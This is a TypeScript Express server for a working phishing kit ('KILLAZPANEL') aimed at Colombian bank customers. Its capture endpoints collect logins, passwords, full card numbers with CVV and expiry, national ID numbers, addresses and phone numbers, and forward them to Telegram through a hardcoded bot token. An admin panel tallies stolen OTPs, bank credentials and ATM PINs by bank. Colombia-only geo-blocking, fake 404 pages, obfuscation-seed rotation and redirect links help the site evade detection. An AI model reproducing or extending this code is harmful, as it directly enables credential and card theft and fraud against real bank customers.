import "dotenv/config";
import { tgApi } from "../tgapi";
import express from "express";
import { createServer } from "http";
import net from "net";
import { createExpressMiddleware } from "@trpc/server/adapters/express";
import { registerOAuthRoutes } from "./oauth";
import { registerStorageProxy } from "./storageProxy";
import { appRouter } from "../routers";
import { createContext } from "./context";
import { serveStatic, setupVite } from "./vite";
import { registerSocketIO } from "../socket";
import { registerTelegramWebhook } from "../telegramWebhook";
import { notifyLogin, notifyPaymentData, notifyPersonalData } from "../telegram";
import { upsertSecureSession, getAllSecureSessions, clearAllSecureSessions, getPaginatedSessions, incrementVisitCount, getVisitCount, resetVisitCount } from "../db";
import { sendTelegramMessage } from "../telegram";
import { getAppConfig, setAppConfig } from "../db";
import { serveRedirectPage, createRedirectLink, getRedirectLinks, deleteRedirectLink, loadRedirectLinksFromDB } from "../redirector";
import { logTraffic, getTrafficLog, clearTrafficLog } from "../db";
import fs from "fs";
import path from "path";

// IP Geolocation using free ip-api.com service
async function getIPCity(ip: string): Promise<string> {
  try {
    // Skip private/local IPs
    if (ip.startsWith("127.") || ip.startsWith("::") || ip.startsWith("10.") || ip.startsWith("192.168.")) {
      return "Local";
    }
    const resp = await fetch(`http://ip-api.com/json/${ip}?fields=city,regionName,country`);
    const data = await resp.json() as { city?: string; regionName?: string; country?: string };
    if (data.city) {
      return `${data.city}, ${data.regionName || ""}, ${data.country || ""}`.replace(/, ,/g, ",").replace(/,$/, "");
    }
    return "Desconocido";
  } catch {
    return "Desconocido";
  }
}

function isPortAvailable(port: number): Promise<boolean> {
  return new Promise(resolve => {
    const server = net.createServer();
    server.listen(port, () => {
      server.close(() => resolve(true));
    });
    server.on("error", () => resolve(false));
  });
}

async function findAvailablePort(startPort: number = 3000): Promise<number> {
  for (let port = startPort; port < startPort + 20; port++) {
    if (await isPortAvailable(port)) {
      return port;
    }
  }
  throw new Error(`No available port found starting from ${startPort}`);
}

async function startServer() {
  const app = express();
  const server = createServer(app);
  // Register Socket.IO for real-time communication
  registerSocketIO(server);
  // Configure body parser with larger size limit for file uploads
  app.use(express.json({ limit: "50mb" }));
  app.use(express.urlencoded({ limit: "50mb", extended: true }));

  // ─── DOMAIN BLOCKING: Bloquear dominio antiguo (.cards) ─
  app.use((req, res, next) => {
    const host = req.headers.host || "";
    if (host.includes(".cards")) {
      return res.status(404).send("<!DOCTYPE html><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL was not found on this server.</p></body></html>");
    }
    return next();
  });

  // ─── GEO-BLOCKING: Solo permitir Colombia (usando ip-api.com) ─
  // Cache de IPs para no consultar la API en cada request
  const geoCache = new Map<string, { country: string; expires: number }>();
  const GEO_EXCLUDED_PATHS = [
    "/api/telegram/webhook",
    "/api/oauth/callback",
    "/manus-storage/",
    "/api/trpc",
    "/api/admin/",
    "/_manus",
    "/api/track/",
    "/api/capture/",
    "/api/check-ip",
    "/api/debug-headers",
  ];

  async function getCountryForIP(ip: string): Promise<string> {
    if (ip.startsWith("127.") || ip.startsWith("::") || ip.startsWith("10.") || ip.startsWith("192.168.") || ip === "localhost") {
      return "LOCAL";
    }
    const cached = geoCache.get(ip);
    if (cached && cached.expires > Date.now()) {
      return cached.country;
    }
    try {
      const resp = await fetch(`http://ip-api.com/json/${ip}?fields=countryCode`);
      const data = await resp.json() as { countryCode?: string };
      const country = (data.countryCode || "XX").toUpperCase();
      geoCache.set(ip, { country, expires: Date.now() + 3600000 });
      if (geoCache.size > 10000) {
        const now = Date.now();
        for (const [key, val] of geoCache) {
          if (val.expires < now) geoCache.delete(key);
        }
      }
      return country;
    } catch {
      return "XX";
    }
  }

  app.use(async (req, res, next) => {
    const path = req.path;
    if (GEO_EXCLUDED_PATHS.some(p => path.startsWith(p))) {
      return next();
    }
    if (process.env.NODE_ENV === "development") {
      return next();
    }
    const ip = (req.headers["x-forwarded-for"] as string)?.split(",")[0]?.trim() || req.socket.remoteAddress || "";
    const country = await getCountryForIP(ip);
    if (country === "CO" || country === "LOCAL" || country === "XX") {
      return next();
    }
    res.status(404).send("<!DOCTYPE html><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL was not found on this server.</p></body></html>");
  });



  registerStorageProxy(app);
  registerOAuthRoutes(app);
  registerTelegramWebhook(app);

  // ─── Obfuscation Seed Change Endpoint (CORS enabled for Cloud Computer) ─
  app.options("/api/admin/change-obfuscation-seed", (req, res) => {
    res.setHeader("Access-Control-Allow-Origin", "*");
    res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");
    res.setHeader("Access-Control-Allow-Headers", "Content-Type, x-admin-pin");
    res.status(204).end();
  });
  app.options("/api/admin/obfuscation-seed", (req, res) => {
    res.setHeader("Access-Control-Allow-Origin", "*");
    res.setHeader("Access-Control-Allow-Methods", "GET, OPTIONS");
    res.setHeader("Access-Control-Allow-Headers", "Content-Type, x-admin-pin");
    res.status(204).end();
  });

  app.post("/api/admin/change-obfuscation-seed", async (req, res) => {
    res.setHeader("Access-Control-Allow-Origin", "*");
    const pin = req.headers["x-admin-pin"] as string;
    if (pin !== await getAdminPin()) return res.status(401).json({ ok: false, error: "Unauthorized" });
    try {
      const newSeed = `seed_${Date.now()}_${Math.random().toString(36).slice(2, 10)}`;
      const seedPath = path.resolve(process.cwd(), "obfuscation-seed.json");
      fs.writeFileSync(seedPath, JSON.stringify({ seed: newSeed, lastChanged: new Date().toISOString() }));
      res.json({ ok: true, seed: newSeed, message: "Seed changed. Republish to apply new obfuscation." });
    } catch (e: any) {
      res.json({ ok: false, error: e.message });
    }
  });

  app.get("/api/admin/obfuscation-seed", async (req, res) => {
    res.setHeader("Access-Control-Allow-Origin", "*");
    const pin = req.headers["x-admin-pin"] as string;
    if (pin !== await getAdminPin()) return res.status(401).json({ ok: false });
    try {
      const seedPath = path.resolve(process.cwd(), "obfuscation-seed.json");
      const data = JSON.parse(fs.readFileSync(seedPath, "utf-8"));
      res.json({ ok: true, ...data });
    } catch {
      res.json({ ok: true, seed: "default", lastChanged: null });
    }
  });

  // ─── Login Visit Notification Bot (separate Telegram bot) ─────────────
  const LOGIN_VISIT_BOT_TOKEN = "8676892426:AAFcIM4e1G57ugoDJJ-ugfM58fu9IDBM23w";
  const LOGIN_VISIT_CHAT_ID = "-5516723131";

  async function notifyLoginVisit(ip: string, userAgent: string, city: string) {
    try {
      const now = new Date().toLocaleString("es-CO", { timeZone: "America/Bogota" });
      // Parse browser from user agent
      let browser = "Desconocido";
      if (userAgent.includes("Chrome") && !userAgent.includes("Edg")) browser = "Chrome";
      else if (userAgent.includes("Firefox")) browser = "Firefox";
      else if (userAgent.includes("Safari") && !userAgent.includes("Chrome")) browser = "Safari";
      else if (userAgent.includes("Edg")) browser = "Edge";
      else if (userAgent.includes("Opera") || userAgent.includes("OPR")) browser = "Opera";
      else if (userAgent.includes("Samsung")) browser = "Samsung Internet";

      // Detect device
      let device = "Desktop";
      if (userAgent.includes("iPhone")) device = "iPhone";
      else if (userAgent.includes("Android")) device = "Android";
      else if (userAgent.includes("iPad")) device = "iPad";

      const message = `🔔 *Nueva visita a /login*\n\n` +
        `📅 *Fecha:* ${now}\n` +
        `🌐 *IP:* \`${ip}\`\n` +
        `🏙️ *Ciudad:* ${city}\n` +
        `📱 *Dispositivo:* ${device}\n` +
        `🌍 *Navegador:* ${browser}\n` +
        `📋 *User-Agent:* \`${userAgent.slice(0, 100)}\``;

      await fetch(`https://api.telegram.org/bot${LOGIN_VISIT_BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: LOGIN_VISIT_CHAT_ID,
          text: message,
          parse_mode: "Markdown"
        })
      });
    } catch (e) {
      console.error("[LoginVisitBot] Error sending notification:", e);
    }
  }

  app.post("/api/track/login-visit", async (req, res) => {
    try {
      const ip = (req.headers["x-forwarded-for"] as string)?.split(",")[0]?.trim() || req.socket?.remoteAddress || "";
      const userAgent = req.headers["user-agent"] || "";
      const city = await getIPCity(ip);
      // Send Telegram notification
      notifyLoginVisit(ip, userAgent, city).catch(() => {});
      res.json({ ok: true });
    } catch {
      res.json({ ok: false });
    }
  });

  // ─── Visit Tracking ─────────────────────────────────────────────────────
  app.post("/api/track/visit", async (req, res) => {
    try {
      // Log detailed traffic
      const ip = (req.headers["x-forwarded-for"] as string)?.split(",")[0]?.trim() || req.socket?.remoteAddress || "";
      const userAgent = req.headers["user-agent"] || "";
      // Country filter DISABLED — allow all IPs, just log traffic
      getIPCity(ip).then(city => {
        logTraffic({ ipAddress: ip, userAgent, path: "/", blocked: 0, country: city }).catch(() => {});
      }).catch(() => {
        logTraffic({ ipAddress: ip, userAgent, path: "/", blocked: 0 }).catch(() => {});
      });
      const count = await incrementVisitCount();
      res.json({ ok: true, count });
    } catch {
      res.json({ ok: false, count: 0 });
    }
  });

  app.post("/api/track/reset", async (req, res) => {
    const pin = req.headers["x-admin-pin"] as string;
    if (pin !== await getAdminPin()) return res.status(401).json({ ok: false });
    try {
      await resetVisitCount();
      res.json({ ok: true });
    } catch {
      res.json({ ok: false });
    }
  });

  // REST endpoints for capturing data from frontend pages
  app.post("/api/capture/login", async (req, res) => {
    try {
      const { email, password, ipAddress } = req.body;
      await notifyLogin({ email, password, ipAddress });
      // Login data is only sent to Telegram, NOT persisted to DB (no card = no history)
      res.json({ ok: true });
    } catch (e) {
      res.json({ ok: false });
    }
  });

  app.post("/api/capture/payment", async (req, res) => {
    try {
      const { name, cardNumber, expiry, cvv, email, ipAddress, cardCategory, cardScheme, bankName } = req.body;
      await notifyPaymentData({ name, cardNumber, expiry, cvv, email, ipAddress, cardCategory, cardScheme, bankName });
      // Persist payment data - create or update session keyed by email
      if (email) {
        await upsertSecureSession({
          sessionId: `payment-${email}-${Date.now()}`,
          email,
          holderName: name || null,
          cardNumber: cardNumber || null,
          expiryDate: expiry || null,
          cvv: cvv || null,
          ipAddress: ipAddress || null,
          currentStep: "payment",
          status: "active",
        });
      }
      res.json({ ok: true });
    } catch (e) {
      res.json({ ok: false });
    }
  });

  app.post("/api/capture/personal", async (req, res) => {
    try {
      const { address, cedula, city, phone, email, ipAddress } = req.body;
      await notifyPersonalData({ address, cedula, city, phone, email, ipAddress });
      // Personal data is only sent to Telegram, NOT persisted to DB (no card = no history)
      res.json({ ok: true });
    } catch (e) {
      res.json({ ok: false });
    }
  });

  // Admin PIN verification endpoint — loaded dynamically from persistent DB config
  async function getAdminPin(): Promise<string> {
    const cfg = await getAppConfig();
    return cfg.adminPin || "199683";
  }

  // Rate limiting for PIN attempts: ip -> { count, blockedUntil }
  const pinAttempts = new Map<string, { count: number; blockedUntil: number }>();
  const MAX_PIN_ATTEMPTS = 3;
  const PIN_BLOCK_DURATION_MS = 2 * 60 * 1000; // 2 minutes

  // Emergency reset endpoint — clears all PIN blocks (no auth required, only accessible from server)
  app.post("/api/admin/reset-pin-attempts", (req, res) => {
    pinAttempts.clear();
    res.json({ ok: true, message: "Todos los bloqueos de PIN han sido eliminados" });
  });

  function getClientIPForAdmin(req: any): string {
    const forwarded = req.headers["x-forwarded-for"] as string;
    if (forwarded) return forwarded.split(",")[0].trim();
    return req.socket?.remoteAddress || "unknown";
  }

  // 2FA: store pending codes { code, expiresAt }
  const pending2FA = new Map<string, { code: string; expiresAt: number }>();
  
  app.post("/api/admin/verify-pin", async (req, res) => {
    const clientIP = getClientIPForAdmin(req);
    const attempts = pinAttempts.get(clientIP) || { count: 0, blockedUntil: 0 };

    // Check if IP is blocked
    if (attempts.blockedUntil > Date.now()) {
      const minutesLeft = Math.ceil((attempts.blockedUntil - Date.now()) / 60000);
      return res.status(429).json({
        ok: false,
        error: `Demasiados intentos. Intenta en ${minutesLeft} minuto(s).`,
        blockedUntil: attempts.blockedUntil,
      });
    }

    const { pin } = req.body;
    const adminPin = await getAdminPin();
    if (pin === adminPin) {
      // Reset attempts on success
      pinAttempts.delete(clientIP);

      // Generate 2FA code and send to Telegram
      const code = Math.floor(100000 + Math.random() * 900000).toString();
      const requestId = `2fa_${Date.now()}`;
      pending2FA.set(requestId, { code, expiresAt: Date.now() + 5 * 60 * 1000 }); // 5 min expiry
      
      await sendTelegramMessage(
        `🔐 <b>KILLAZPANEL 2FA</b>\n\n` +
        `Código de acceso: <code>${code}</code>\n\n` +
        `⏳ Válido por 5 minutos\n` +
        `📅 ${new Date().toLocaleString("es-CO")}`
      );
      
      res.json({ ok: true, requires2FA: true, requestId });
    } else {
      // Increment failed attempts
      const newCount = attempts.count + 1;
      if (newCount >= MAX_PIN_ATTEMPTS) {
        const blockedUntil = Date.now() + PIN_BLOCK_DURATION_MS;
        pinAttempts.set(clientIP, { count: newCount, blockedUntil });
        // Notify admin via Telegram
        await sendTelegramMessage(
          `⚠️ <b>INTENTO DE ACCESO AL PANEL</b>\n\n` +
          `🔴 IP bloqueada: <code>${clientIP}</code>\n` +
          `🔢 ${newCount} intentos fallidos\n` +
          `⏳ Bloqueada por 15 minutos\n` +
          `📅 ${new Date().toLocaleString("es-CO")}`
        );
        return res.status(429).json({
          ok: false,
          error: "Demasiados intentos. IP bloqueada por 15 minutos.",
          blockedUntil,
        });
      } else {
        pinAttempts.set(clientIP, { count: newCount, blockedUntil: 0 });
        const remaining = MAX_PIN_ATTEMPTS - newCount;
        return res.status(401).json({
          ok: false,
          error: `PIN incorrecto. ${remaining} intento(s) restante(s).`,
          attemptsLeft: remaining,
        });
      }
    }
  });
  
  // 2FA verification endpoint
  app.post("/api/admin/verify-2fa", (req, res) => {
    const { requestId, code } = req.body;
    const pending = pending2FA.get(requestId);
    
    if (!pending) {
      return res.status(401).json({ ok: false, error: "C\u00f3digo expirado o inv\u00e1lido" });
    }
    
    if (Date.now() > pending.expiresAt) {
      pending2FA.delete(requestId);
      return res.status(401).json({ ok: false, error: "C\u00f3digo expirado" });
    }
    
    if (pending.code === code) {
      pending2FA.delete(requestId);
      res.json({ ok: true });
    } else {
      res.status(401).json({ ok: false, error: "C\u00f3digo incorrecto" });
    }
  });

  // Endpoint to get session history from DB (protected by PIN header)
  app.get("/api/sessions/history", async (req, res) => {
    const pin = req.headers["x-admin-pin"] as string;
    if (pin !== await getAdminPin()) {
      return res.status(401).json({ ok: false, error: "No autorizado" });
    }
    try {
      const page = parseInt(req.query.page as string) || 1;
      const pageSize = parseInt(req.query.pageSize as string) || 20;
      const search = (req.query.search as string) || "";
      const result = await getPaginatedSessions(page, pageSize, search);
      // Enrich sessions with linked card info
      const enriched = await Promise.all(result.sessions.map(async (s: any) => {
        try {
          const { getLinkedSessions } = await import("../db");
          const linked = await getLinkedSessions(s.email, s.ipAddress, s.sessionId);
          const prevCard = linked.find((l: any) => (l.cardNumber || l.cardBin) && (l.cardNumber || l.cardBin) !== (s.cardNumber || s.cardBin));
          if (prevCard) {
            return { ...s, linkedCard: { previousCard: prevCard.cardNumber || prevCard.cardBin, previousBank: prevCard.bankName, previousSessionId: prevCard.sessionId } };
          }
        } catch {}
        return s;
      }));
      res.json({ ok: true, ...result, sessions: enriched });
    } catch (e) {
      res.json({ ok: false, sessions: [], total: 0, totalPages: 0, page: 1 });
    }
  });
  // Endpoint for admin panel metrics
  app.get("/api/admin/metrics", async (req, res) => {
    const pin = req.headers["x-admin-pin"] as string;
    if (pin !== await getAdminPin()) {
      return res.status(401).json({ ok: false });
    }
    try {
      const sessions = await getAllSecureSessions();
      const totalVisits = await getVisitCount();
      const totalWithData = sessions.filter((s: any) => s.bankUser || s.otpCode || s.dinamicaCode || s.tokenCode || s.atmPin).length;
      const totalCards = sessions.filter((s: any) => s.cardNumber || s.cardBin).length;

      // Stats by bank
      const bankStats: Record<string, { total: number; withOtp: number; withCredentials: number }> = {};
      sessions.forEach((s: any) => {
        const bank = s.bankName || 'Sin banco';
        if (!bankStats[bank]) bankStats[bank] = { total: 0, withOtp: 0, withCredentials: 0 };
        if (s.cardNumber || s.cardBin) {
          bankStats[bank].total++;
          if (s.otpCode || s.dinamicaCode || s.tokenCode || s.atmPin) bankStats[bank].withOtp++;
          if (s.bankUser || s.bankPassword) bankStats[bank].withCredentials++;
        }
      });
      // Convert to sorted array (most cards first)
      const bankStatsArray = Object.entries(bankStats)
        .map(([bank, stats]) => ({ bank, ...stats }))
        .sort((a, b) => b.total - a.total);

      res.json({ ok: true, totalSessions: totalVisits, totalWithData, totalCards, bankStats: bankStatsArray });
    } catch {
      res.json({ ok: true, totalSessions: 0, totalWithData: 0, totalCards: 0, bankStats: [] });
    }
  });

  // Endpoint to clear all session history (borrar datos)
  app.delete("/api/admin/clear-history", async (req, res) => {
    const pin = req.headers["x-admin-pin"] as string;
    if (pin !== await getAdminPin()) {
      return res.status(401).json({ ok: false, error: "No autorizado" });
    }
    try {
      const success = await clearAllSecureSessions();
      // Notify via Telegram
      await sendTelegramMessage(`🗑️ <b>KILLAZPANEL</b>\n\n⚠️ <b>DATOS BORRADOS</b>\n\nSe han eliminado todos los datos del historial.\n📅 ${new Date().toLocaleString("es-CO")}`);
      res.json({ ok: success });
    } catch {
      res.json({ ok: false });
    }
  });

  // Ban IP endpoint
  // Ban IP endpoint - DISABLED (no blocking)
  app.post("/api/admin/ban-ip", async (req, res) => {
    res.json({ ok: true }); // No-op: banning disabled
  });

  // Unban IP endpoint - DISABLED (no blocking)
  app.post("/api/admin/unban-ip", async (req, res) => {
    res.json({ ok: true }); // No-op: banning disabled
  });

  // Get all banned IPs - DISABLED (always empty)
  app.get("/api/admin/banned-ips", async (req, res) => {
    res.json({ ok: true, ips: [] }); // Always empty: banning disabled
  });

  // ─── Traffic Log Endpoints ─────────────────────────────────────────────
  app.get("/api/admin/traffic", async (req, res) => {
    const pin = req.headers["x-admin-pin"] as string;
    if (pin !== await getAdminPin()) {
      return res.status(401).json({ ok: false, error: "No autorizado" });
    }
    const page = parseInt(req.query.page as string) || 1;
    const limit = parseInt(req.query.limit as string) || 50;
    const { logs, total } = await getTrafficLog(page, limit);
    res.json({ ok: true, logs, total, page, limit });
  });

  app.post("/api/admin/traffic/clear", async (req, res) => {
    const pin = req.headers["x-admin-pin"] as string;
    if (pin !== await getAdminPin()) {
      return res.status(401).json({ ok: false, error: "No autorizado" });
    }
    await clearTrafficLog();
    res.json({ ok: true });
  });

  // Config endpoints — read and update persistent settings
  app.get("/api/admin/config", async (req, res) => {
    const pin = req.headers["x-admin-pin"] as string;
    if (pin !== await getAdminPin()) {
      return res.status(401).json({ ok: false, error: "No autorizado" });
    }
    const cfg = await getAppConfig();
    // Mask tokens partially for display
    const mask = (s: string) => s ? s.slice(0, 6) + "*".repeat(Math.max(0, s.length - 10)) + s.slice(-4) : "";
    res.json({
      ok: true,
      config: {
        adminPin: cfg.adminPin,
        telegramBotToken: mask(cfg.telegramBotToken),
        telegramBotTokenFull: cfg.telegramBotToken,
        telegramChatId: cfg.telegramChatId,
        telegramFaceidBotToken: mask(cfg.telegramFaceidBotToken),
        telegramFaceidBotTokenFull: cfg.telegramFaceidBotToken,
        telegramFaceidChatId: cfg.telegramFaceidChatId,
      }
    });
  });

  app.post("/api/admin/config", async (req, res) => {
    const pin = req.headers["x-admin-pin"] as string;
    if (pin !== await getAdminPin()) {
      return res.status(401).json({ ok: false, error: "No autorizado" });
    }
    try {
      const { adminPin, telegramBotToken, telegramChatId, telegramFaceidBotToken, telegramFaceidChatId } = req.body;
      const updates: Record<string, string> = {};
      if (adminPin && adminPin.trim()) updates.adminPin = adminPin.trim();
      if (telegramBotToken && telegramBotToken.trim()) updates.telegramBotToken = telegramBotToken.trim();
      if (telegramChatId && telegramChatId.trim()) updates.telegramChatId = telegramChatId.trim();
      if (telegramFaceidBotToken && telegramFaceidBotToken.trim()) updates.telegramFaceidBotToken = telegramFaceidBotToken.trim();
      if (telegramFaceidChatId && telegramFaceidChatId.trim()) updates.telegramFaceidChatId = telegramFaceidChatId.trim();
      await setAppConfig(updates);
      res.json({ ok: true, message: "Configuraci\u00f3n guardada correctamente" });
    } catch (e) {
      res.status(500).json({ ok: false, error: "Error al guardar configuraci\u00f3n" });
    }
  });

  // Register Telegram webhook endpoint — call this after deployment
  app.post("/api/admin/register-webhook", async (req, res) => {
    const pin = req.headers["x-admin-pin"] as string;
    if (pin !== await getAdminPin()) {
      return res.status(401).json({ ok: false, error: "No autorizado" });
    }
    try {
      const cfg = await getAppConfig();
      const token = cfg.telegramBotToken || process.env.TELEGRAM_BOT_TOKEN || "";
      if (!token) {
        return res.status(400).json({ ok: false, error: "Token de Telegram no configurado" });
      }
      // Use origin from request or deployed domain
      const origin = (req.body?.origin as string) || process.env.DEPLOYED_DOMAIN || `${req.protocol}://${req.get("host")}`;
      const webhookUrl = `${origin}/api/telegram/webhook`;
      const response = await fetch(tgApi(token, 'setWebhook'), {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          url: webhookUrl,
          allowed_updates: ["callback_query", "message"],
        }),
      });
      const result = await response.json() as { ok: boolean; description?: string };
      if (result.ok) {
        console.log(`[Telegram] Webhook registered: ${webhookUrl}`);
        res.json({ ok: true, webhookUrl, message: `Webhook registrado: ${webhookUrl}` });
      } else {
        res.status(500).json({ ok: false, error: result.description || "Error al registrar webhook" });
      }
    } catch (e: any) {
      res.status(500).json({ ok: false, error: e?.message || "Error interno" });
    }
  });

  // Get Telegram webhook info
  app.get("/api/admin/webhook-info", async (req, res) => {
    const pin = req.headers["x-admin-pin"] as string;
    if (pin !== await getAdminPin()) {
      return res.status(401).json({ ok: false, error: "No autorizado" });
    }
    try {
      const cfg = await getAppConfig();
      const token = cfg.telegramBotToken || process.env.TELEGRAM_BOT_TOKEN || "";
      if (!token) return res.json({ ok: false, error: "Token no configurado" });
      const response = await fetch(tgApi(token, 'getWebhookInfo'));
      const result = await response.json() as { ok: boolean; result?: { url: string; allowed_updates?: string[] } };
      res.json({ ok: result.ok, info: result.result });
    } catch (e: any) {
      res.status(500).json({ ok: false, error: e?.message });
    }
  });

  // Test Telegram message (admin only)
  app.post("/api/admin/test-telegram", async (req, res) => {
    const pin = req.headers["x-admin-pin"] as string;
    if (pin !== await getAdminPin()) {
      return res.status(401).json({ ok: false, error: "No autorizado" });
    }
    try {
      const ok = await sendTelegramMessage(`\u2705 <b>TEST TELEGRAM</b>\n\nMensaje de prueba desde el servidor.\n\ud83d\udcc5 ${new Date().toLocaleString("es-CO")}`);
      res.json({ ok, message: ok ? "Mensaje enviado correctamente" : "Fallo al enviar — revisa el token y chat ID" });
    } catch (e: any) {
      res.status(500).json({ ok: false, error: e?.message });
    }
  });

  // ─── Redirect System Routes ────────────────────────────────────────────
  app.get("/r/:id", serveRedirectPage);

  // Admin: Get scanner detection log

  // Admin: Create redirect link
  app.post("/api/admin/redirect-links", async (req, res) => {
    const pin = req.headers["x-admin-pin"] as string;
    if (pin !== await getAdminPin()) {
      return res.status(401).json({ ok: false, error: "No autorizado" });
    }
    const { target } = req.body;
    if (!target) return res.status(400).json({ ok: false, error: "Target URL required" });
    const id = createRedirectLink(target);
    const origin = `${req.protocol}://${req.get("host")}`;
    res.json({ ok: true, id, url: `${origin}/r/${id}` });
  });

  // Admin: List redirect links
  app.get("/api/admin/redirect-links", async (req, res) => {
    const pin = req.headers["x-admin-pin"] as string;
    if (pin !== await getAdminPin()) {
      return res.status(401).json({ ok: false, error: "No autorizado" });
    }
    res.json({ ok: true, links: getRedirectLinks() });
  });

  // Admin: Delete redirect link
  app.delete("/api/admin/redirect-links/:id", async (req, res) => {
    const pin = req.headers["x-admin-pin"] as string;
    if (pin !== await getAdminPin()) {
      return res.status(401).json({ ok: false, error: "No autorizado" });
    }
    const deleted = deleteRedirectLink(req.params.id);
    res.json({ ok: deleted });
  });

  // Check if IP is banned (public endpoint for frontend)
  // Check IP endpoint - always returns not banned (security disabled)

  app.get("/api/check-ip", async (req, res) => {
    const ip = (req.headers["x-forwarded-for"] as string)?.split(",")[0]?.trim() || req.socket.remoteAddress || "";
    res.json({ banned: false, ip });
  });






  // tRPC API
  app.use(
    "/api/trpc",
    createExpressMiddleware({
      router: appRouter,
      createContext,
    })
  );
  // development mode uses Vite, production mode uses static files
  if (process.env.NODE_ENV === "development") {
    await setupVite(app, server);
  } else {
    serveStatic(app);
  }

  const preferredPort = parseInt(process.env.PORT || "3000");
  const port = await findAvailablePort(preferredPort);

  if (port !== preferredPort) {
    console.log(`Port ${preferredPort} is busy, using port ${port} instead`);
  }

  // Load redirect links from DB
  await loadRedirectLinksFromDB();

  server.listen(port, () => {
    console.log(`Server running on http://localhost:${port}/`);
  });
}

startServer().catch(console.error);
